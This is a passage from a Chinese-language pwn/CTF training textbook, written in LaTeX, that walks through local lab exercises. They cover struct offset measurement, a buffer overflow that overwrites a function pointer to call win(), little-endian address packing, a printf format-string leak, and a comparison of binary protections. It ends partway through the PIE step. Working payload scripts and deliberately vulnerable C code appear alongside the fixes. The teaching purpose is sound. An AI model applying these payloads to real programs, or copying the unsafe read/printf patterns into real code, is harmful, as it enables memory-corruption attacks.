cd ~/pwn-lab && grep -n -e read -e session.next overflow.c
\end{lstlisting}
应该看到：结构体声明在\kw{第 8--11 行}（\code{char name[24];} 是第 9 行、\code{void (*next)(void);} 是第 10 行）；\code{read} 在\kw{第 18 行}、\code{session.next();} 在\kw{第 19 行}。带着行号讨论“哪一行有问题”，比笼统说“程序有个漏洞”精确得多——P1、P4 都会反复用到这几个行号。
\item 用一个小程序实测布局。\code{layout.c} 已随包放在 \code{labs/pwn/}，并在第 1 章复制到了 \code{\textasciitilde/pwn-lab/}；它的作用是用 \code{offsetof} 直接问编译器“某字段排在第几个字节”，代码只有这么几行：
\begin{lstlisting}[language=C]
#include <stddef.h>
#include <stdio.h>
struct Session { char name[24]; void (*next)(void); };
int main(void) {
    printf("sizeof(struct Session) = %zu
", sizeof(struct Session));
    printf("offsetof(next)         = %zu
", offsetof(struct Session, next));
    return 0;
}
\end{lstlisting}
（结构体定义要和 \code{overflow.c} 里逐字一致，否则量出来的偏移没有意义。）如果你的练习目录里没有这个文件，照上面内容新建 \code{layout.c} 存盘即可。编译运行：
\begin{lstlisting}
cd ~/pwn-lab && gcc -o layout layout.c && ./layout
\end{lstlisting}
\figref{struct-layout} 是真实执行结果：\code{sizeof(struct Session) = 32}、\code{offsetof(next) = 24}。这一步把“猜”变成“量”。
\item 用反汇编交叉验证。\code{objdump -d overflow | tail -32}（\figref{objdump-main}）里，\code{read} 的目标地址是 \code{-0x20(\%rbp)}、函数指针在 \code{-0x8(\%rbp)}，两者相差 \code{0x18} = 24，与 \code{offsetof} 结果一致。
\item 结论：输入从偏移 0 开始写，偏移 0--23 是 \code{name}，偏移 24 起是 \code{next}。所以第 25 个输入字节（按 1 开始计数）落在偏移 24，也就是 \code{next} 的第一个字节。
\end{enumerate}

\shot[0.95]{fig-pwn-26-source-grep.png}{第 4 章 P0 第 2 步：用 \code{grep -n} 带行号定位关键行——结构体在 8--11 行、\code{read} 在 18 行、\code{session.next();} 在 19 行（真实终端实录，WSL）}{source-grep}

\paragraph{结果与核对}\code{sizeof(struct Session)} = 32（本机实测，换构建重测），\code{offsetof(next)} = 24（本机实测，换构建重测）。第 25 个字节落在 \code{next} 函数指针的第一个字节。两条独立证据（\code{offsetof} 实测 + \code{objdump} 反汇编的 \code{0x18} 间距）互相印证，结论可靠。

\paragraph{为什么会成功}一句话机制：\kw{结构体字段在内存里按声明顺序连续排列，指针是 8 字节}。展开说：\code{name[24]} 占偏移 0--23，\code{next} 从偏移 24 开始、占 24--31，所以结构体总大小 32。程序写 “32 字节” 而不是 “24 字节”，等于主动多写了 8 字节，恰好完整覆盖 \code{next}。你也可能遇到编译器插入“填充字节”的情况——那就以 \code{offsetof} 实测为准，别照抄 24。

\debugtip{
\begin{itemize}
\item \code{offsetof(next)} 结果不是 24：检查 \code{layout.c} 里的结构体定义是否和 \code{overflow.c} 逐字一致（顺序、数组长度、指针类型）；换编译器/参数也可能变，以实测为凭；
\item \code{gcc: layout.c: No such file}: 你不在 \code{\textasciitilde/pwn-lab}，或还没创建 \code{layout.c}，先 \code{cd} 到正确目录并确认文件存在；
\item 反汇编里找不到 \code{read}：\code{main} 不在 \code{tail} 的范围里，把 \code{tail -32} 换成更大的数字或直接 \code{objdump -d overflow | grep -A30 "<main>"}；
\item 把结构体大小算成 24：忘了 \code{sizeof session} 含函数指针，$24+8=32$，不是数组大小 24。
\end{itemize}}

\paragraph{变式练习}
\begin{enumerate}
\item 把 \code{layout.c} 里的 \code{name} 改成 \code{char name[32];}，重新编译运行，预测并验证新的 \code{offsetof(next)} 与结构体大小。
\item 把结构体改成 \code{char tag; char name[24]; void (*next)(void);}，观察编译器是否在 \code{tag} 与 \code{name} 之间插入填充，并解释为什么偏移会变。
\item 在 \code{overflow.c} 里把 \code{read} 的第三个参数从 \code{sizeof session} 改成 \code{sizeof session.name}，重新编译，观察越界警告是否消失，并说明这样改是否“修好了漏洞”。
\end{enumerate}

% ===========================================================================
\section{题 P1：怎样把函数指针改指向 win？}

\begin{challenge}{题 P1 题面卡}
\field{题目来源}{本地练习 \code{labs/pwn/overflow.c}（离线可做）}
\field{给定材料}{编译产物 \code{\textasciitilde/pwn-lab/overflow}；源码里有会打印 flag 的 \code{win} 函数}
\field{目标}{构造恰好 32 字节的输入，让程序调用 \code{win} 并打印 flag}
\field{交付物}{payload 文件（或一条可复现命令）+ 程序输出的 \code{flag\{...\}}；同时给出 \code{win} 地址来源}
\field{考点}{越界写入覆盖相邻函数指针；小端地址打包；payload 长度核对}
\field{前置知识}{2.5 节 结构体偏移；2.6 节 越界写入；2.7 节 字节序；3.3/3.4 节 \code{nm}、\code{objdump}}
\field{难度}{$\bigstar\bigstar\circ$（进阶）}
\end{challenge}

\paragraph{读题与思路}交付物是程序打印的 flag。P0 已经量出“偏移 24 起是函数指针”，本题要把它改成 \code{win} 的地址。先把这道题的\kw{四问}答一遍，后面的每个动作才有依据：

\begin{enumerate}[label=\arabic*.]
\item \kw{漏洞在哪}：\code{main} 第 18 行的 \code{read(0, session.name, sizeof session)} 要写 32 字节，目标是 24 字节的数组——多写的 8 字节落在哪里，P0 已经量清楚；
\item \kw{我能控制什么}：从结构体开头算，偏移 0--31 全部由输入决定，其中偏移 24--31 正好是函数指针 \code{next} 的 8 个字节；
\item \kw{我要去哪里}：源码里只有 \code{win()} 会打印 flag（\code{normal()} 打印的是 \code{Try again.}），所以目标是让 \code{session.next()} 这一步跳到 \code{win}；
\item \kw{有没有拦路虎}：本题的编译参数 \code{-O0 -fno-stack-protector -no-pie} 让地址固定、越界写不被检测，两大前提都满足，不需要额外绕过（P4 会演示前提不满足时会怎样）。
\end{enumerate}

四问答完，执行计划就固定成三步：\kw{先建基线}（正常输入得到什么，用来对照）、\kw{再取地址}（当前产物里 \code{win} 在哪，只能从 \code{nm} 读）、\kw{最后造字节}（24 个填充 + 8 字节小端地址 = 32 字节）。为什么顺序不能颠倒？不先建基线，程序打印 \code{Try again.} 时你分不清是“payload 没生效”还是“程序本来就是这个行为”；不先从当前产物取地址，你可能抄到别的构建的地址，一跳就段错误。

还有两个容易忽略的细节。第一，\kw{地址只能从当前产物读}，讲义里的 \code{0x401190} 只是这次编译的结果。第二，\kw{送进去的字节数必须自己数}：\code{echo} 会额外送一个换行，手敲 32 个字符也不可靠，所以本册一律用“文件重定向”把精确构造好的 \code{payload.bin} 喂给程序，并用 \code{wc -c} 复核长度——这一步做错了，后面看到的所有现象都会误导你。

\paragraph{分步操作与观察}
\begin{enumerate}[label=\arabic*.]
\item 先跑正常输入，记录基线：
\begin{lstlisting}
cd ~/pwn-lab && echo alice | ./overflow
cd ~/pwn-lab && echo bob | ./overflow; echo exit code OK
\end{lstlisting}
\figref{normal-run} 是真实结果：两次都打印 \code{Name:} 加 \code{Try again.}，并且程序正常退出（打印了 \code{exit code OK}）。这一步确认“调用 \code{normal} 打印 Try again.”是正常行为。
\item 读源码，确认 \code{win} 就是会打印 flag 的函数：
\begin{lstlisting}
cat ~/pwn-lab/overflow.c
\end{lstlisting}
\figref{overflow-src} 是真实结果：\code{static void normal(void) \{ puts("Try again."); \}}、\code{void win(void) \{ puts("flag\{control\_flow\_redirected\}"); \}}，\code{read} 从 \code{session.name} 写 \code{sizeof session}（32）字节。看到 \code{win} 的存在，就知道本题的目标是“让程序跳进 \code{win}”。
\item 取当前产物里 \code{win} 的地址（\figref{readelf-nm} 下半）：
\begin{lstlisting}
cd ~/pwn-lab && nm overflow | grep -e win -e normal
\end{lstlisting}
应该看到 \code{0000000000401190 T win}。\kw{这个地址是本次编译产物特有的，换构建要重读}。同时也看到 \code{normal} 在 \code{0x401176}，正是函数指针的初值。
\item 用 Python 生成 payload 并核对长度。\code{make\_payload.py} 已随包放在 \code{labs/pwn/}，并在第 1 章复制到了 \code{\textasciitilde/pwn-lab/}；如果你换了练习目录、那里没有这个文件，就照下面内容新建一个（\kw{务必把 \code{win} 的地址换成你上一步 \code{nm} 读到的那个}，换构建后地址会变）：
\begin{lstlisting}[language=Python]
import struct
win = 0x401190              # from: nm overflow | grep win   (this build only!)
payload = b"A" * 24 + struct.pack("<Q", win)
open("payload.bin", "wb").write(payload)
print("win address   =", hex(win))
print("payload len   =", len(payload))
print("payload hex   =", payload.hex())
\end{lstlisting}
运行它生成 payload，再看生成的字节：
\begin{lstlisting}
cd ~/pwn-lab && python3 make_payload.py
cd ~/pwn-lab && xxd payload.bin
\end{lstlisting}
\figref{payload-xxd} 是真实结果：脚本打印 \code{win address = 0x401190}、\code{payload len = 32}、\code{payload hex = 4141...9011400000000000}；\code{xxd} 显示前 24 个 \code{41}（24 个 \code{A}）后紧跟 \code{9011 4000 0000 0000}。长度是 32、末 8 字节是小端地址——两个前提都满足。
\item 亲自动手核对字节数。先看清 \code{echo} 与 \code{printf} 送出的字节数差别（\figref{byte-count}）：
\begin{lstlisting}
cd ~/pwn-lab && printf AAAA | wc -c
cd ~/pwn-lab && echo AAAA | wc -c
cd ~/pwn-lab && echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | wc -c
cd ~/pwn-lab && wc -c payload.bin
\end{lstlisting}
应该看到 \code{printf AAAA} 是 4 字节，而 \code{echo AAAA} 是 5 字节——\code{echo} 会额外补一个换行符；所以“敲 32 个 \code{A} 再 \code{echo}”实际送出的是 33 字节。最后一条 \code{wc -c payload.bin} 显示 \code{32}，这才是能送进程序的输入。\kw{二进制 payload 一律用文件重定向，不用 echo}。
\item 再做一次长度实验：把 32 字节的 payload 剪短、加长，看程序分别怎么反应（\figref{length-experiment}）：
\begin{lstlisting}
cd ~/pwn-lab && head -c 31 payload.bin > p31.bin && cp payload.bin p33.bin && printf X >> p33.bin && wc -c p31.bin payload.bin p33.bin
cd ~/pwn-lab && ./overflow < p31.bin && echo 31 bytes OK
cd ~/pwn-lab && ./overflow < p33.bin && echo 33 bytes OK
cd ~/pwn-lab && ./overflow < payload.bin && echo 32 bytes OK
cd ~/pwn-lab && printf AAAAAAAAAAAAAAAAAAAAAAAAA | ./overflow && echo 25 bytes A-fill no flag no Try again
cd ~/pwn-lab && printf AAAAAAAAAAAAAAAAAAAA | ./overflow && echo 20 bytes still the normal branch
\end{lstlisting}
这张图要逐段读，它解释了“为什么规矩是 32”：
\begin{itemize}
\item 前四条：\code{p31.bin} 是 \code{payload.bin} 的前 31 字节（24 个 \code{A} 加地址的高 7 位），\code{p33.bin} 是在 32 字节后再补一个 \code{X}；31、32、33 三个长度\kw{本次都打印了 flag}；
\item 但只有 32 是“把 8 字节地址完整写满”。31 能成功，是因为指针原来的最高字节本来就是 \code{00}（\code{normal} 与 \code{win} 都在 \code{0x00401xxx} 段，\figref{payload-xxd} 末 8 字节里那一串 \code{00} 就是证据）；33 “没炸”，是因为多出的那个字节盖到了栈上保存的 \code{rbp} 低字节，本次恰好没造成可见后果；
\item 最后两条是“长度不对”的另两种典型现象：25 个 \code{A}（首字节被改成无效值 \code{0x41}）只打印 \code{Name:}，\kw{既不打印 flag 也不打印 Try again}——程序跳去了别处；20 字节没碰到指针，走正常分支打印 \code{Try again.}。
\end{itemize}
结论：31 与 33 的成功是\kw{碰巧}（地址高位本来就是 0、多写的那个字节恰好无害），换一个地址或换一种栈布局立刻失效；能\kw{保证}成功的是“偏移 0--23 填满、偏移 24--31 写完整 8 字节地址”，也就是恰好 32 字节。
\item 把 payload 送进程序（两种方式都试一次）：
\begin{lstlisting}
cd ~/pwn-lab && ./overflow < payload.bin
cd ~/pwn-lab && python3 -c "import struct,sys;sys.stdout.buffer.write(b'A'*24+struct.pack('<Q',0x401190))" | ./overflow
\end{lstlisting}
\figref{overflow-win} 是真实结果：两条命令都输出 \code{flag\{control\_flow\_redirected\}}。同一张图最后一行还重跑了 \code{echo alice | ./overflow}，仍得到 \code{Try again.}，证明“正常输入走正常分支、构造输入走 \code{win}”两种行为可复现。
\end{enumerate}

\shot[0.95]{fig-pwn-04-normal-run.png}{第 4 章 P1 第 1 步：基线——普通输入 \code{echo alice | ./overflow} 得到 \code{Try again.} 且程序正常退出（真实终端实录，WSL）}{normal-run}

\shot[0.95]{fig-pwn-03-overflow-src.png}{第 4 章 P1 第 2 步：\code{cat overflow.c} 全文——\code{win} 打印 flag、\code{read} 写 32 字节进 \code{name[24]}（真实终端实录，WSL）}{overflow-src}

\shot[0.95]{fig-pwn-08-payload-xxd.png}{第 4 章 P1 第 4 步：\code{make\_payload.py} 生成 32 字节 payload，\code{xxd} 显示 24 个 \code{41} 加 \code{9011 4000 ...}（真实终端实录，WSL）}{payload-xxd}

\shot[0.95]{fig-pwn-23-byte-count.png}{第 4 章 P1 第 5 步：字节数核对——\code{printf AAAA} 是 4 字节、\code{echo AAAA} 是 5 字节（多一个换行），32 个 \code{A} 送进去其实是 33 字节，\code{payload.bin} 恰好 32（真实终端实录，WSL）}{byte-count}

\shot[0.95]{fig-pwn-22-length-experiment.png}{第 4 章 P1 第 6 步：长度实验——31/32/33 字节都打印了 flag（31、33 属于碰巧成立），25 个 \code{A} 只打印 \code{Name:}，20 字节走正常分支（真实终端实录，WSL）}{length-experiment}

\shot[0.95]{fig-pwn-09-overflow-win.png}{第 4 章 P1 第 7 步：文件重定向与管道两种方式都得到 \code{flag\{control\_flow\_redirected\}}，再跑正常输入仍是 \code{Try again.}（真实终端实录，WSL）}{overflow-win}

\paragraph{结果与核对}程序打印：
\flagbox{flag\{control\_flow\_redirected\}}
独立核对有四条：一，\code{len(payload)==32}（24 填充 + 8 地址）；二，\code{payload[-8:].hex()} 等于 \code{9011400000000000}，与 \code{nm} 读到的 \code{win=0x401190} 的小端一致；三，用正常输入重跑，程序仍打印 \code{Try again.}，说明行为只由输入决定，不是程序坏了；四，\figref{length-experiment} 还提醒一件事：\kw{“打印出 flag”不等于“构造完全正确”}——31 与 33 字节也能打印，所以必须用前两条核对\kw{构造本身}，不能只看最后一行输出。

\paragraph{为什么会成功}一句话机制：\kw{越界的 8 字节落到了函数指针 \code{next} 上，把它改成了 \code{win} 的地址}。展开说：程序从 \code{name} 起写 32 字节，前 24 字节是“名字”，后 8 字节正好盖住 \code{next}。因为 \code{next} 是指针，程序随后执行 \code{session.next()}，即 \code{call *\%rax}，\code{rax} 里已是你写进去的 \code{win} 地址，于是跳进 \code{win}。这里没有执行任何新代码（没放 shellcode），只是“借用”了程序里已有的函数——这正是它不受 NX 影响的原因（见 P4）。\kw{地址必须是小端 8 字节原始数据}，写十进制文本程序读不懂。

\debugtip{
\begin{itemize}
\item 程序打印 \code{Try again.}：输入长度不超过 24 字节，指针根本没被碰到（\figref{length-experiment} 里 20 字节那一条就是这种）。先用 \code{wc -c} 看输入长度；
\item 程序只打印 \code{Name:} 就结束，既没有 flag 也没有 \code{Try again.}：指针被\kw{部分}改写成无效地址（例如 25 个 \code{A} 把首字节改成 \code{0x41}），程序跳去了别处。逐字节核对输入末 8 字节；
\item 程序段错误（\code{Segmentation fault}）：地址无效或宽度不对——常是把 \code{0x401190} 当成文本写进去，或用了 4 字节的 \code{'<I'} 打包。核对 \code{payload[-8:].hex() == '9011400000000000'}；
\item 地址不对：你可能抄了旧地址。重新 \code{nm overflow | grep win} 读“刚编译的这个文件”；
\item 管道传不进去零字节：某些 shell/工具会截断含 \code{\textbackslash x00} 的数据；改用 \code{./overflow < payload.bin} 这种文件重定向最稳；
\item 用了 \code{overflow-pie}（默认编译）却还想着跳 \code{0x401190}：PIE 版地址每次加载都变，\code{nm} 的地址用不上，见 P4。
\end{itemize}}

\paragraph{变式练习}
\begin{enumerate}
\item 把 \code{make\_payload.py} 里的填充字符从 \code{A}（\code{0x41}）改成 \code{B}，重新生成并 \code{xxd} 核对：功能应完全一样，体会“填充内容无所谓，长度才关键”。
\item 把 payload 做成 31 字节与 33 字节各跑一遍（\figref{length-experiment} 已给出真实现象：两者都成功）。请解释：31 字节为什么也能跳对？如果 \code{win} 的地址是 \code{0x7f1122334455} 这种最高字节非零的地址，31 字节还会成功吗？33 字节“没炸”又是因为多出的那个字节落到了哪里？
\item 把目标地址改成同一产物里 \code{normal} 的地址（\code{0x401176}）打包送进去，观察程序仍打印 \code{Try again.}，从现象反证“指针被改写成了我给的地址”。
\end{enumerate}

% ===========================================================================
\section{题 P2：地址 0x401190 该按什么顺序写？}

\begin{challenge}{题 P2 题面卡}
\field{题目来源}{本地练习（离线可做），题面即本卡}
\field{给定材料}{一个地址值 \code{0x401190}；背景是 P1 的目标字段需要一个 8 字节的指针}
\field{目标}{给出该地址在 x86-64 小端内存里的 8 个字节，并说明如何用 Python 生成与还原}
\field{交付物}{8 字节序列（十六进制形式）+ 一段 \code{struct.pack}/\code{unpack} 的核对代码}
\field{考点}{字节序；整数与原始字节的区别；高位零字节不能丢}
\field{前置知识}{2.7 节 字节序；3.6 节 \code{xxd}；3.7 节 \code{struct}}
\field{难度}{$\bigstar\circ\circ$（入门）}
\end{challenge}

\paragraph{读题与思路}本题只问一个地址该怎么写成字节。看到“地址 + 8 字节”，要立刻调出两条知识：x86-64 是\kw{小端}（低位在前），指针宽度是\kw{8 字节}（高位零必须保留）。所以先把 \code{0x401190} 看成 \code{0x0000000000401190}，再从小端拆成 \code{90 11 40 00 00 00 00 00}。为什么强调“别写成文本”？因为目标字段是指针，它期待 8 个原始字节；把 \code{0x401190} 这七个字符敲进去，字段里会变成字符 \code{0}、\code{x}、\code{4} 的编码，完全不是那个地址。

\paragraph{分步操作与观察}
\begin{enumerate}[label=\arabic*.]
\item 用 \code{struct.pack} 打包并用两种视图核对（\figref{endian-pack}）：
\begin{lstlisting}
cd ~/pwn-lab && python3 endian_demo.py
\end{lstlisting}
应该看到 \code{little-endian = 90 11 40 00 00 00 00 00}、\code{big-endian = 00 00 00 00 00 40 11 90}、\code{unpack back = 0x401190}。小端与大端正好反序，解包能还原，说明这就是正确的 8 字节。
\item 再看“字节列表”视角（\figref{py-struct}）：
\begin{lstlisting}
cd ~/pwn-lab && python3 -c "import struct;b=struct.pack('<Q',0x401190);print(b.hex());print(list(b));print(len(b))"
\end{lstlisting}
应该看到 \code{9011400000000000}、\code{[144, 17, 64, 0, 0, 0, 0, 0]}、\code{8}。\code{144=0x90}、\code{17=0x11}、\code{64=0x40}，只是同一个字节的十进制写法。
\item 放进完整 payload 的语境里看：这就是 P1 那 8 字节尾巴。\code{xxd payload.bin}（\figref{payload-xxd}）里第 25--32 字节正是 \code{9011 4000 0000 0000}。
\end{enumerate}

\paragraph{结果与核对}8 字节序列（小端）是 \code{90 11 40 00 00 00 00 00}，即十六进制串 \code{9011400000000000}。独立核对：\code{struct.unpack('<Q', b)[0]} 还原出 \code{4198800}，其十六进制为 \code{0x401190}，与输入一致。\kw{本机实测，换构建重测}——这个地址只属于当前 \code{overflow} 产物。

\paragraph{为什么会成功}一句话机制：\kw{地址是整数，写进内存要按字节序展开成固定宽度}。展开说：CPU 从内存读一个 8 字节指针时，按“低位在低地址”解释，所以必须先写 \code{0x90} 再写 \code{0x11}……最后补 \code{00}。如果漏掉末尾的零字节，指针就少了两字节，程序读到的地址会错位。\code{struct.pack('<Q', addr)} 一次把这三件事（小端、8 字节宽、零填充）都做对了，所以比自己手拼字节可靠。

\debugtip{
\begin{itemize}
\item 打出来是 \code{90114000}（4 字节）：用了 \code{'<I'} 而不是 \code{'<Q'}。64 位地址必须用 8 字节；
\item 打出来是 \code{0011409000000000} 之类：方向反了或手工拼错，检查格式符 \code{<}（小端）和字节顺序；
\item 解包结果不等于原地址：格式符必须与打包时一致（都 \code{'<Q'}），否则会得到奇怪的大整数；
\item 直接把 \code{0x401190} 当字符串写进 payload：目标字段得到的是 ASCII 编码而不是地址，程序会崩溃。
\end{itemize}}

\paragraph{变式练习}
\begin{enumerate}
\item 把地址换成 \code{0x123456789abcdef0}，分别用 \code{<Q} 和 \code{>Q} 打包，写出两组 8 字节并解释哪组会出现在 x86-64 内存里。
\item 用 \code{struct.pack('<Q', 0x401190)} 得到的字节，按“从高地址到低地址”的顺序再列一遍，体会“内存视图”和“书写视图”的差别。
\item 给出 \code{9011400000000000}，用 \code{bytes.fromhex} 与 \code{struct.unpack('<Q', ...)} 还原地址并验证。
\end{enumerate}

% ===========================================================================
\section{题 P3：一句 printf 怎样泄漏秘密？}

\begin{challenge}{题 P3 题面卡}
\field{题目来源}{本地练习 \code{labs/pwn/format.c}（离线可做）}
\field{给定材料}{编译产物 \code{\textasciitilde/pwn-lab/format}；源码把用户输入当格式串，并把秘密字符串指针传为第一个可变参数}
\field{目标}{让程序把秘密字符串打印出来}
\field{交付物}{一行输入（格式串）+ 程序输出的 \code{flag\{...\}}；并说明修复写法}
\field{考点}{格式串漏洞：数据被当成指令；\code{\%s} 与 \code{\%p} 的区别}
\field{前置知识}{2.8 节 格式串原理；3.5 节 \code{strings}；3.6 节 \code{xxd}（可选）}
\field{难度}{$\bigstar\bigstar\circ$（进阶）}
\end{challenge}

\paragraph{读题与思路}交付物是程序打印的秘密字符串。源码里出现了危险写法 \code{printf(input, secret)}：格式串来自用户输入，且秘密指针是第一个可变参数。看到这种题要立刻想到：\kw{输入会被当成“格式说明书”解释}。

思路拆成三小步，每一步都在回答一个具体问题：
\begin{enumerate}[label=\arabic*.]
\item \kw{危险到底危在哪}：\code{printf} 的第 1 个参数是“说明书”。正常代码里这份说明书写死在源码里，用户输入只能填到参数位置；这里说明书\kw{来自用户输入}，于是输入的百分号不再是文本，而是会被执行的\kw{格式指令}；
\item \kw{该用什么格式说明}：秘密指针在\kw{第 1 个可变参数}位置，所以用“取第 1 个参数当字符串地址”的 \code{\%s}（想显式指定位置就写 \code{\%1\$s}，\code{1\$} 是位置标记）。为什么不用 \code{\%p}？\code{\%p} 只把指针打印成一个数，\code{\%s} 会\kw{按地址把字符串内容读出来}——我们要的是内容；
\item \kw{怎么确认位置没数错}：先拿 \code{\%p} 把每个位置的值看一眼，再用 \code{\%s} 去读。位置数错时 \code{\%s} 会把一个无效值当地址去解引用，程序当场崩溃——这个现象本身就是“位置对不对”的信号（第 3 步会亲眼看一次）。
\end{enumerate}
动手前先用普通输入建立基线（\code{hello} 原样打印），再逐步加格式说明，每一步都观察输出怎么变。

\paragraph{分步操作与观察}
\begin{enumerate}[label=\arabic*.]
\item 读源码，确认秘密指针的位置（\figref{format-src}）：
\begin{lstlisting}
cat ~/pwn-lab/format.c
\end{lstlisting}
应该看到 flag 常量定义和 \code{printf(input, secret);}。其中 \code{secret} 就是第一个可变参数。
\item 建立基线，再逐步加格式说明（\figref{format-leak}）：
\begin{lstlisting}
cd ~/pwn-lab && echo hello | ./format
cd ~/pwn-lab && echo %s | ./format
cd ~/pwn-lab && echo %p | ./format
cd ~/pwn-lab && echo %p %p %p %p | ./format
\end{lstlisting}
应该看到四种现象：输入 \code{hello} 原样打印（没有 \code{\%}，说明不是格式说明，直接输出）；输入 \code{\%s} 打印出 \code{flag\{format\_string\_leaks\}}（把第 1 个参数当字符串地址读了）；输入 \code{\%p} 打印一个十六进制数 \code{0x5dd37a0b8004}（把参数当指针打印）；输入四个 \code{\%p} 得到四个值，其中一串是无参数的随机栈数据——说明“有几个格式说明，就去取几个参数”。
\item 亲手数一遍参数位置，并看清“位置数错会怎样”（\figref{format-args}）：
\begin{lstlisting}
cd ~/pwn-lab && echo %p %p %p | ./format
cd ~/pwn-lab && echo A%sB | ./format
cd ~/pwn-lab && echo %s %s %s %s | ./format
\end{lstlisting}
应该看到三种现象：三个 \code{\%p} 打印出三个值，但\kw{只有第 1 个是程序特意传入的 \code{secret} 地址}，另外两个是寄存器/栈上的残留值（每次运行都可能不同，不能依赖）；\code{A\%sB} 打印成 \code{Aflag\{format\_string\_leaks\}B}，说明 \code{\%s} 是\kw{原地替换}，它前后的普通字符照常输出；四个 \code{\%s} 则\kw{直接段错误}——本次运行里前两个位置碰巧也取到了同一个地址，第三个位置的值不是合法字符串地址，\code{\%s} 一解引用程序就崩了。记住这个现象：\kw{读错位置的 \%s 会崩溃}，这正是 296 必须先数参数位置的原因（见 4.6 节）。
\item 用 \code{strings} 独立确认秘密常量确实在二进制里（\figref{strings}）：
\begin{lstlisting}
cd ~/pwn-lab && strings format | grep -e flag -e Say
\end{lstlisting}
应该看到 \code{flag\{format\_string\_leaks\}} 与 \code{Say something:}，证明 \code{\%s} 读到的正是这个常量。
\item 看修复版，确认“固定格式串”就安全（\figref{fixed-format}）：
\begin{lstlisting}
cd ~/pwn-lab && gcc -O0 -o fixed_format fixed_format.c
cd ~/pwn-lab && echo %s | ./fixed_format
cd ~/pwn-lab && echo %p | ./fixed_format
\end{lstlisting}
应该看到修复版把 \code{\%s} 原样打印成 \code{\%s}、把 \code{\%p} 原样打印成 \code{\%p}——因为格式串变成了常量 \code{"\%s"}，用户的百分号只是普通文本。
\end{enumerate}

\shot[0.95]{fig-pwn-11-format-src.png}{第 4 章 P3 第 1 步：\code{cat format.c}——\code{secret} 常量与危险的 \code{printf(input, secret)}（真实终端实录，WSL）}{format-src}

\shot[0.95]{fig-pwn-12-format-leak.png}{第 4 章 P3 第 2 步：\code{hello}/\code{\%s}/\code{\%p}/\code{\%p \%p \%p \%p} 四种输入的真实输出，\code{\%s} 泄漏出 flag（真实终端实录，WSL）}{format-leak}

\shot[0.95]{fig-pwn-24-format-args.png}{第 4 章 P3 第 3 步：数参数位置——三个 \code{\%p} 只有第 1 个是 \code{secret} 地址，\code{A\%sB} 原地替换成 \code{Aflag\{...\}B}，而四个 \code{\%s} 因位置数错直接段错误（真实终端实录，WSL）}{format-args}

\shot[0.95]{fig-pwn-14-fixed-format.png}{第 4 章 P3 第 5 步：修复版 \code{printf("\%s", input)} 下，\code{\%s} 与 \code{\%p} 都原样打印（真实终端实录，WSL）}{fixed-format}

\paragraph{结果与核对}输入 \code{\%s}（复发场景用 \code{\%1\$s} 指定第一个参数）得到：
\flagbox{flag\{format\_string\_leaks\}}
独立核对：\code{strings format | grep flag} 显示二进制里确实有这串常量，与 \code{\%s} 的输出逐字符一致；再用修复版输入同样的 \code{\%s}，输出变成字面文本 \code{\%s}，说明漏洞来自“谁控制格式串”，而不是输入本身有什么魔法。

\paragraph{为什么会成功}一句话机制：\kw{printf 把格式串当“说明书”，而说明书来自用户，于是用户能指挥它去读参数}。展开说：\code{printf(input, secret)} 里，\code{input} 变成格式串，\code{secret} 变成第一个可变参数。当你输入 \code{\%s}，printf 就按 \code{\%s} 的规则“把第一个参数当字符串地址，读它指向的内存”，正好读到 \code{secret} 指向的 flag 常量。\code{\%p} 同理，只是它打印指针值本身。真实题里秘密通常不在第 1 个参数位，需要用一串 \code{\%p} 先去“数参数位置”——296 就是这样做的（见 4.6 节）。

\debugtip{
\begin{itemize}
\item 输入 \code{\%s} 后程序崩溃：\code{\%s} 会把“某个参数”当地址去解引用，若该位置不是有效字符串地址就会崩。这是格式串利用的常态，先在本地靶程序里小步试；
\item 输入 \code{\%s} 只打印出 \code{\%s}：你跑的是 \code{input[128]} 那个危险版吗？确认没误跑 \code{fixed\_format}；
\item 想读的位置不对：用位置参数 \code{\%1\$s} 明确指定“第 1 个参数”，避免依赖默认取参顺序；
\item \code{echo} 时百分号被 shell 解释：本机 bash 的 \code{echo} 不解释 \code{\%}，若换 shell 出现异常，用 \code{printf '\%s\textbackslash n' '\%s' | ./format} 明确传字符串。
\end{itemize}}

\paragraph{变式练习}
\begin{enumerate}
\item 把源码里的秘密指针从“第一个可变参数”改成“第三个”（例如把 \code{secret} 移到第 3 个参数位置），重新编译，用 \code{\%3\$s} 读它，观察位置参数必须随之改变。
\item 用 \code{\%p} 连打 8 个参数，把输出和 \code{objdump} 里的调用点对照，尝试解释哪几个值可能来自寄存器/栈（提示：\code{rdi} 是格式串本身）。
\item 把 \code{printf(input, secret)} 改成 \code{fputs(input, stdout)}，重新编译，用 \code{\%s} 与 \code{\%p} 测试，确认两者都只按文本输出，说明为什么“用不解析格式的输出函数”也是有效修复。
\end{enumerate}

% ===========================================================================
\section{题 P4：加了保护，P1 的哪一步会变化？}

\begin{challenge}{题 P4 题面卡}
\field{题目来源}{本地练习 \code{labs/pwn/overflow.c} 的默认编译版（离线可做）}
\field{给定材料}{同一份源码的两个产物：\code{overflow}（教学参数）与 \code{overflow-pie}（默认参数）}
\field{目标}{分别指出 PIE/ASLR、Canary、NX、RELRO 各作用在 P1 利用链的哪一步，并说明默认版为什么更难}
\field{交付物}{一张对照表：保护机制 → 卡住的步骤 → 观察到的证据（参照 \code{file}/\code{readelf}/\code{objdump} 输出）}
\field{考点}{保护机制的分段分析；从证据到结论的推断}
\field{前置知识}{2.9 节 保护机制总览；3.8 节 \code{gcc} 与保护开关}
\field{难度}{$\bigstar\bigstar\circ$（进阶）}
\end{challenge}

\paragraph{读题与思路}交付物是一张“保护机制 → 卡住的步骤 → 证据”对照表。拿到同一份源码的两个产物，先别急着说“开了保护所以打不了”，而要\kw{逐条定位}：PIE 让地址变化，卡的是取地址那一步；Canary 检测栈被改，卡的是越界写那一步；NX 限制执行新代码，卡的是 shellcode 那一步；RELRO 保护 GOT，卡的是改函数地址表那一步。判断依据必须来自证据（\code{file}、\code{readelf}、\code{objdump} 输出），而不是背缩写。

\paragraph{分步操作与观察}
\begin{enumerate}[label=\arabic*.]
\item 用默认参数编译一个 PIE 版，和教学版放到一起比较（\figref{protect-check}）：
\begin{lstlisting}
cd ~/pwn-lab && gcc -O0 -o overflow-pie overflow.c
cd ~/pwn-lab && file overflow overflow-pie
\end{lstlisting}
应该看到 \code{overflow} 是 \code{ELF 64-bit LSB executable}、\code{overflow-pie} 是 \code{ELF 64-bit LSB pie executable}。这是 PIE 开关的第一条证据。
\item 用 \code{readelf} 直接读“类型”字段：
\begin{lstlisting}
cd ~/pwn-lab && LANG=C readelf -h overflow | grep Type
